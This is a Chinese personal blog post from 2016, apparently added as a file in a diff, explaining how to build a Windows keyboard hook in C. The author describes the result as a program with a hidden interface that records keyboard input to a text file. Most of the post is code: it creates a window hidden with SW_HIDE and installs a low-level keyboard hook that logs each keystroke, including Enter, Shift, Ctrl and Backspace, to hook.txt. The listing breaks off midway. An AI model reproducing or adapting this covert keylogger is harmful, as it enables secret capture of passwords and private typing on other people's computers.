@@ -1,0 +1,683 @@
+<!doctype html>
+<html class="theme-next use-motion ">
+<head>
+  
+
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+
+
+  <link rel="stylesheet" type="text/css" href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5"/>
+
+
+<link rel="stylesheet" type="text/css" href="/css/main.css?v=0.4.3"/>
+
+
+    <meta name="description" content="stay foolish,stay hungry" />
+
+
+
+  <meta name="keywords" content="windows," />
+
+
+
+
+
+  <link rel="shorticon icon" type="image/x-icon" href="/favicon.ico?v=0.4.3" />
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var CONFIG = {
+    scheme: '',
+    analytics: {
+      google: ''
+    },
+    sidebar: 'post'
+  };
+</script>
+
+
+
+
+
+
+
+<!---------------------js------------------------->
+<script type="text/javascript">
+window.onload=function ()
+{
+  var otab1=document.getElementById('tab1');
+  var oa1=document.getElementsByTagName("a")[0]
+  oa1.onmouseover=function ()
+  {
+    startMove(otab1, 'opacity', 100);
+  };
+  oa1.onmouseout=function ()
+  {
+    startMove(otab1, 'opacity', 0);
+  };
+};
+
+function getStyle(obj, name)
+{
+  if(obj.currentStyle)
+  {
+    return obj.currentStyle[name];
+  }
+  else
+  {
+    return getComputedStyle(obj, false)[name];
+  }
+}
+
+function startMove(obj, attr, iTarget)
+{
+  clearInterval(obj.timer);
+  obj.timer=setInterval(function (){
+    var cur=0;
+    
+    if(attr=='opacity')
+    {
+      cur=Math.round(parseFloat(getStyle(obj, attr))*100);
+    }
+    else
+    {
+      cur=parseInt(getStyle(obj, attr));
+    }
+    
+    var speed=(iTarget-cur)/6;
+    speed=speed>0?Math.ceil(speed):Math.floor(speed);
+    
+    if(cur==iTarget)
+    {
+      clearInterval(obj.timer);
+    }
+    else
+    {
+      if(attr=='opacity')
+      {
+        obj.style.filter='alpha(opacity:'+(cur+speed)+')';
+        obj.style.opacity=(cur+speed)/100;
+        
+        document.getElementById('txt1').value=obj.style.opacity;
+      }
+      else
+      {
+        obj.style[attr]=cur+speed+'px';
+      }
+    }
+  }, 30);
+}
+</script>
+  <title> Windows下简单hook键盘监听 // 边城的彼方 </title>
+</head>
+
+<body>
+  <!--[if lte IE 8]>
+  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
+    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
+      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
+           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
+           style='margin-left:auto;margin-right:auto;display: block;'/>
+    </a>
+  </div>
+<![endif]-->
+
+  <div class="container one-column page-post-detail">
+    <div class="headband"></div>
+
+    <div id="header" class="header">
+      <div class="header-inner">
+         <h1 class="site-meta">
+  <!--<span class="logo-line-before"><i></i></span>
+  <a href="/" class="brand">
+      <span class="logo">
+        
+      </span> 
+      <span class="site-title">边城的彼方</span>
+  </a>
+  <span class="logo-line-after"><i></i></span>-->
+  
+  <a href="/" class="brand">
+      <span class="logo">
+        
+      </span> 
+      <span class="site-title" ><font face="华文行楷">边城的彼方</font></span>
+  </a>
+  <div class="tab" id="tab1">
+    <span  class="site-title"><font face="华文行楷">请拒绝平庸</span></font>
+  </div>
+</h1>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<div class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu menu-left">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/">
+            <i class="menu-item-icon icon-home"></i> <br />
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            <i class="menu-item-icon icon-archives"></i> <br />
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            <i class="menu-item-icon icon-tags"></i> <br />
+            Tags
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  
+<form class="site-search-form">
+  <input type="text" id="st-search-input" class="st-search-input st-default-search-input" />
+</form>
+<script type="text/javascript">
+  (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
+    (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
+    e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
+  })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
+
+  _st('install', 'dfS1S9Qk_HTAxBxsdonf','2.0.0');
+</script>
+
+<div class="site-search-toggle"></div>
+    </div>
+  
+</div>
+
+
+      </div>
+    </div>
+
+    <div id="main" class="main">
+      <div class="main-inner">
+        <div id="content" class="content">
+          
+
+  <div id="posts" class="posts-expand">
+    
+
+  <div class="post post-type-normal ">
+    <div class="post-header">
+
+      
+      
+        <h1 class="post-title">
+          
+          
+            
+              Windows下简单hook键盘监听
+            
+          
+        </h1>
+      
+
+      <div class="post-meta">
+        <span class="post-time">
+          Posted on 2016-06-17
+        </span>
+
+        
+
+        
+          
+            <span class="post-comments-count">
+            &nbsp; | &nbsp;
+            <a href="/2016/06/17/hook/#comments" >
+              <span class="post-comments-count ds-thread-count" data-thread-key="2016/06/17/hook/"></span>
+            </a>
+          </span>
+          
+        
+      </div>
+    </div>
+
+    <div class="post-body">
+
+      
+      
+
+      
+        <p><del>好久没更新过博客了，本来这博客我是打算只发布一些我遇到的有点意思的东西，但是我对这个‘有意思’要求太过苛刻，再加上懒癌晚期，将近半年没更新了，所以我决定以后我就发布一些对我自己有意义的博文吧</del>。</p>
+<p><strong>我的程序是一个隐藏了界面的钩子程序，它会把键盘的输入写进一个文本中。</strong></p>
+<h2 id="认识Hook">认识Hook</h2><p><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms632589.aspx" target="_blank" rel="noopener">hook-MSDN</a></p>
+<blockquote>
+<p>A hook is a point in the system message-handling mechanism where an application can install a subroutine to monitor the message traffic in the system and process certain types of messages before they reach the target window procedure.</p>
+</blockquote>
+<p>大意就是：hook(钩子）是在系统信息处理机制的一个点，其中，应用程序可以安装一个钩子来监测该系统和方法的某些类型的消息在它们到达目标窗口过程之前。<br>我把钩子理解成一个消息过滤网，在某些消息到达目标窗口之前先进行过滤（拦截，更改..）</p>
+<h2 id="Windows下键盘监听"><strong>Windows下键盘监听</strong></h2><p>实现Windows下键盘监听其实很简单，用的就是几个windows api<br>大概有以下3个步骤：</p>
+<ol>
+<li>绘制窗口</li>
+<li>设置钩子</li>
+<li>设置监听键盘消息</li>
+</ol>
+<h3 id="1-绘制窗口"><strong>1.绘制窗口</strong></h3><p>绘制窗口的代码基本都一样。<br>你们可以到<a href="http://www.lellansin.com/windows-sdk-%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%80%EF%BC%89%E5%88%9B%E5%BB%BA%E7%AE%80%E5%8D%95%E7%9A%84dialog%E7%AA%97%E5%8F%A3.html" target="_blank" rel="noopener">传送门</a>blog上看一下，博主也是在这里学习的<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// 5. 窗口过程处理</span></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WndProc</span><span class="params">(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    <span class="keyword">switch</span>(msg)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> WM_CLOSE:</span><br><span class="line">            DestroyWindow(hwnd);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> WM_DESTROY:</span><br><span class="line">            PostQuitMessage(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> DefWindowProc(hwnd, msg, wParam, lParam);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">WinMain</span><span class="params">(HINSTANCE hInstance, HINSTANCE hPrevInstance,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPSTR lpCmdLine, <span class="keyword">int</span> nCmdShow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    WNDCLASSEX wc;  <span class="comment">// 更多详细都可以去百度的 http://baike.baidu.com/view/1750396.htm</span></span><br><span class="line">    HWND hwnd;</span><br><span class="line">    MSG Msg;</span><br><span class="line">    <span class="comment">//为了区分我设置了日期</span></span><br><span class="line">    <span class="comment">//=======设置日期</span></span><br><span class="line">	<span class="keyword">char</span> date[<span class="number">9</span>];</span><br><span class="line">	<span class="keyword">int</span> day;</span><br><span class="line">	SYSTEMTIME Time=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">	GetLocalTime(&amp;Time);</span><br><span class="line">	day=Time.wYear*<span class="number">10000</span>+Time.wMonth*<span class="number">100</span>+Time.wDay;</span><br><span class="line">	date[<span class="number">8</span>]=<span class="string">'\0'</span>;</span><br><span class="line">	_itoa_s(day,date,<span class="number">10</span>);</span><br><span class="line">	<span class="comment">///检查文件是否为空</span></span><br><span class="line">	fopen_s(&amp;f,<span class="string">"hook.txt"</span>,<span class="string">"a+"</span>);</span><br><span class="line">	fseek(f,<span class="number">0</span>,SEEK_END);</span><br><span class="line">	<span class="keyword">int</span> length=ftell(f);</span><br><span class="line">	fclose(f);</span><br><span class="line">	<span class="comment">//==================</span></span><br><span class="line">	fopen_s(&amp;f,<span class="string">"hook.txt"</span>,<span class="string">"a+"</span>);</span><br><span class="line">	<span class="keyword">if</span>(length!=<span class="number">0</span>)</span><br><span class="line">		fputc(<span class="string">'\n'</span>,f);</span><br><span class="line">	fwrite(date,<span class="keyword">sizeof</span>(date),<span class="number">1</span>,f);</span><br><span class="line">	fputc(<span class="string">':'</span>,f);</span><br><span class="line">	fclose(f);</span><br><span class="line"> <span class="comment">////===========================</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> szClassName[] = <span class="string">"myWindowClass"</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 1. 设置注册窗口结构体</span></span><br><span class="line">    wc.cbSize        = <span class="keyword">sizeof</span>(WNDCLASSEX);              <span class="comment">// 注册窗口结构体的大小</span></span><br><span class="line">    wc.style         = <span class="number">0</span>;                               <span class="comment">// 窗口的样式</span></span><br><span class="line">    wc.lpfnWndProc   = WndProc;                         <span class="comment">// 指向窗口处理过程的函数指针</span></span><br><span class="line">    wc.cbClsExtra    = <span class="number">0</span>;                               <span class="comment">// 指定紧跟在窗口类结构后的附加字节数</span></span><br><span class="line">    wc.cbWndExtra    = <span class="number">0</span>;                               <span class="comment">// 指定紧跟在窗口事例后的附加字节数</span></span><br><span class="line">    wc.hInstance     = hInstance;                       <span class="comment">// 本模块的实例句柄</span></span><br><span class="line">    wc.hIcon         = LoadIcon(<span class="literal">NULL</span>, IDI_APPLICATION); <span class="comment">// 图标的句柄</span></span><br><span class="line">    wc.hCursor       = LoadCursor(<span class="literal">NULL</span>, IDC_ARROW);     <span class="comment">// 光标的句柄</span></span><br><span class="line">    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW+<span class="number">1</span>);        <span class="comment">// 背景画刷的句柄</span></span><br><span class="line">    wc.lpszMenuName  = <span class="literal">NULL</span>;                            <span class="comment">// 指向菜单的指针</span></span><br><span class="line">    wc.lpszClassName = szClassName;                     <span class="comment">// 指向类名称的指针</span></span><br><span class="line">    wc.hIconSm       = LoadIcon(<span class="literal">NULL</span>, IDI_APPLICATION); <span class="comment">// 和窗口类关联的小图标</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 2. 使用【窗口结构体】注册窗口</span></span><br><span class="line">    <span class="keyword">if</span>(!RegisterClassEx(&amp;wc))</span><br><span class="line">    &#123;</span><br><span class="line">        MessageBox(<span class="literal">NULL</span>, TEXT(<span class="string">"窗口注册失败！"</span>), TEXT(<span class="string">"错误"</span>), MB_ICONEXCLAMATION | MB_OK);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 3. 创建窗口</span></span><br><span class="line">    hwnd = CreateWindowEx(</span><br><span class="line">        WS_EX_CLIENTEDGE,       <span class="comment">// 窗口的扩展风格</span></span><br><span class="line">        szClassName,            <span class="comment">// 指向注册类名的指针</span></span><br><span class="line">        TEXT(<span class="string">"窗口标题"</span>),       <span class="comment">// 指向窗口名称的指针</span></span><br><span class="line">        WS_OVERLAPPEDWINDOW,    <span class="comment">// 窗口风格</span></span><br><span class="line">        CW_USEDEFAULT, CW_USEDEFAULT, <span class="number">350</span>, <span class="number">200</span>, <span class="comment">// 窗口的 x,y 坐标以及宽高</span></span><br><span class="line">        <span class="literal">NULL</span>,                   <span class="comment">// 父窗口的句柄</span></span><br><span class="line">        <span class="literal">NULL</span>,                   <span class="comment">// 菜单的句柄</span></span><br><span class="line">        hInstance,              <span class="comment">// 应用程序实例的句柄</span></span><br><span class="line">        <span class="literal">NULL</span>                    <span class="comment">// 指向窗口的创建数据</span></span><br><span class="line">        );</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(hwnd == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        MessageBox(<span class="literal">NULL</span>, TEXT(<span class="string">"窗口创建失败"</span>), TEXT(<span class="string">"错误"</span>),MB_ICONEXCLAMATION | MB_OK);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 4. 显示窗口</span></span><br><span class="line">    ShowWindow(hwnd, SW_HIDE);<span class="comment">//SW_HIDE隐藏界面</span></span><br><span class="line">    UpdateWindow(hwnd);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 6. 消息循环</span></span><br><span class="line">    <span class="keyword">while</span>(GetMessage(&amp;Msg, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>) &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        TranslateMessage(&amp;Msg);</span><br><span class="line">        DispatchMessage(&amp;Msg);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> Msg.wParam;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h3 id="2-设置钩子"><strong>2.设置钩子</strong></h3><h4 id="SetWindowsHookEx_函数">SetWindowsHookEx 函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HHOOK WINAPI <span class="title">SetWindowsHookEx</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_ <span class="keyword">int</span>       idHook,<span class="comment">// 安装的钩子类型</span></span></span></span><br><span class="line"><span class="function"><span class="params">  _In_ HOOKPROC  lpfn,<span class="comment">// 处理消息的回调函数</span></span></span></span><br><span class="line"><span class="function"><span class="params">  _In_ HINSTANCE hMod,<span class="comment">// 当前实例句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">  _In_ DWORD     dwThreadId<span class="comment">// 线程ID</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>Installs an application-defined hook procedure into a hook chain. You would install a hook procedure to monitor the system for certain types of events. These events are associated either with a specific thread or with all threads in the same desktop as the calling thread.</p>
+</blockquote>
+<p>以上就是说安装钩子子程序到钩子链表来监听某些事件。</p>
+<h4 id="钩子链表"><strong>钩子链表</strong></h4><p>每一个Hook都有一个与之相关联的指针列表，称之为钩子链表，由系统来维护。这个列表的指针指向指定的，应用程序定义的，被Hook子程调用的回调函数，也就是该钩子的各个处理子程。当与指定的Hook类型关联的消息发生时，系统就把这个消息传递到Hook子程。 一些Hook子程可以只监视消息，或者修改消息，或者停止消息的前进，避免这些消息传递到下一个Hook子程或者目的窗口。最后安装的钩子放在链的开始， 而最早安装的钩子放在最后，也就是后加入的先获得控制权。<br>Windows 并不要求钩子子程的卸载顺序一定得和安装顺序相反。每当有一个钩子被卸载，Windows 便释放其占用的内存，并更新整个Hook链表。如果程序安装了钩子，但是在尚未卸载钩子之前就结束了，那么系统会自动为它做卸载钩子的操作。</p>
+<h4 id="钩子子程序"><strong>钩子子程序</strong></h4><p>钩子子程是一个应用程序定义的回调函数(CALLBACK Function),不能定义成某个类的成员函数，只能定义为普通的C函数。用以监视系统或某一特定类型的事件，这些事件可以是与某一特定线程关联的，也可以是系统中所有线程的事件。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">LRESULT CALLBACK HookProc <span class="comment">//HookProc是回调函数名。</span></span><br><span class="line">(</span><br><span class="line"><span class="keyword">int</span> nCode,</span><br><span class="line"><span class="comment">//nCode参数是Hook代码，Hook子程使用这个参数来确定任务。这个参数的值依赖于Hook类型，每一种Hook都有自己的Hook代码特征字符集。</span></span><br><span class="line">WPARAM wParam,</span><br><span class="line">LPARAM lParam</span><br><span class="line"><span class="comment">//wParam和lParam参数的值依赖于Hook代码，但是它们的典型值是包含了关于发送或者接收消息的信息。</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure></p>
+<h3 id="3-设置键盘监听"><strong>3.设置键盘监听</strong></h3><p>设置键盘监听就是通过钩子子程序接收到参数来做出处理。</p>
+<p>PKBDLLHOOKSTRUCT 是 WH_KEYBOARD_LL 方式中用来接收消息的结构体，来自winduser.h</p>
+<blockquote>
+<p>我们监听键盘的时候主要用的是该结构体的 vkCode（value code）和 scanCode 这两个字段。即键盘的【值码】和【扫描码】那么为什么判断一个按键要分成两个部分呢，原因是因为世界上的键盘有很多种，不同国家、不同厂商生产的键盘甚，至同一个键盘上【同样的键】不同的地方按下都可能会有差异。vkCode 是常见的一般都是公用的键盘值，而 scanCode 扫描码则是用来辅助区分的一个一个参数，例如同样是按下 ctrl 键，他们的 vkCode 是相同的但是 scanCode 却不同</p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">FILE *f;</span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">KeyboardProc</span><span class="params">(<span class="keyword">int</span> nCode, WPARAM wParam, LPARAM lParam)</span> </span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *info = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">int</span> code=p-&gt;vkCode; </span><br><span class="line">    <span class="keyword">if</span> (nCode &gt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      	<span class="comment">/*WM_KEYUP/WM_KEYDOWN 普通按钮松开/按下</span></span><br><span class="line"><span class="comment">      	WM_SYSKEYUP/WM_SYSKEYDOWN 系统按钮松开/按下*/</span></span><br><span class="line">      	</span><br><span class="line">		<span class="keyword">if</span>(wParam==WM_KEYUP||wParam==WM_SYSKEYUP)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(code==<span class="number">160</span>||code==<span class="number">161</span>)&#123;</span><br><span class="line">				fopen_s(&amp;f,<span class="string">"hook.txt"</span>,<span class="string">"a+"</span>);</span><br><span class="line">				fwrite(<span class="string">"[shift up]"</span>,<span class="keyword">sizeof</span>(<span class="string">"[shift up]"</span>)<span class="number">-1</span>,<span class="number">1</span>,f);</span><br><span class="line">				fclose(f);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">// 将消息继续往下传递</span></span><br><span class="line">			<span class="keyword">return</span> CallNextHookEx(myhook, nCode, wParam, lParam);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//对于某些键特殊处理，因为直接把vkcode转char得不到键名</span></span><br><span class="line">		<span class="keyword">if</span>(wParam==WM_KEYDOWN||wParam==WM_SYSKEYDOWN)&#123;</span><br><span class="line">			fopen_s(&amp;f,<span class="string">"hook.txt"</span>,<span class="string">"a+"</span>);</span><br><span class="line">			<span class="keyword">switch</span>(code)&#123;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">219</span>:</span><br><span class="line">					fputc(<span class="string">'['</span>,f);</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">221</span>:</span><br><span class="line">					fputc(<span class="string">']'</span>,f);</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">186</span>:</span><br><span class="line">					fputc(<span class="string">';'</span>,f);</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">222</span>:</span><br><span class="line">					fputc(<span class="string">'\''</span>,f);</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">188</span>:</span><br><span class="line">					fputc(<span class="string">','</span>,f);</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">190</span>:</span><br><span class="line">					fputc(<span class="string">'.'</span>,f);</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">191</span>:</span><br><span class="line">					fputc(<span class="string">'/'</span>,f);</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">13</span>:<span class="comment">//减1是为了字符串最后的\0不打印</span></span><br><span class="line">					fwrite(<span class="string">"[enter]"</span>,<span class="keyword">sizeof</span>(<span class="string">"[enter]"</span>)<span class="number">-1</span>,<span class="number">1</span>,f);</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">162</span>:</span><br><span class="line">					fwrite(<span class="string">"[left ctrl]"</span>,<span class="keyword">sizeof</span>(<span class="string">"[left ctrl]"</span>)<span class="number">-1</span>,<span class="number">1</span>,f);</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">163</span>:</span><br><span class="line">					fwrite(<span class="string">"[right ctrl]"</span>,<span class="keyword">sizeof</span>(<span class="string">"[right ctrl]"</span>)<span class="number">-1</span>,<span class="number">1</span>,f);</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">160</span>:</span><br><span class="line">					fwrite(<span class="string">"[left shift]"</span>,<span class="keyword">sizeof</span>(<span class="string">"[left shift]"</span>)<span class="number">-1</span>,<span class="number">1</span>,f);</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">161</span>:</span><br><span class="line">					fwrite(<span class="string">"[right shift]"</span>,<span class="keyword">sizeof</span>(<span class="string">"[right shift]"</span>)<span class="number">-1</span>,<span class="number">1</span>,f);</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">					fwrite(<span class="string">"[backspace]"</span>,<span class="keyword">sizeof</span>(<span class="string">"[backspace]"</span>)<span class="number">-1</span>,<span class="number">1</span>,f);</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">20</span>:</span><br><span class="line">					fwrite(<span class="string">"[CapsLock]"</span>,<span class="keyword">sizeof</span>(<span class="string">"[CapsLock]"</span>)<span class="number">-1</span>,<span class="number">1</span>,f);</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">					fwrite(<span class="string">"[tab]"</span>,<span class="keyword">sizeof</span>(<span class="string">"[tab]"</span>)<span class="number">-1</span>,<span class="number">1</span>,f);</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">164</span>:</span><br><span class="line">					fwrite(<span class="string">"[left alt]"</span>,<span class="keyword">sizeof</span>(<span class="string">"[left alt]"</span>)<span class="number">-1</span>,<span class="number">1</span>,f);</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">165</span>:</span><br><span class="line">					fwrite(<span class="string">"[right alt]"</span>,<span class="keyword">sizeof</span>(<span class="string">"[right alt]"</span>)<span class="number">-1</span>,<span class="number">1</span>,f);</span><br><span class="line">					<span 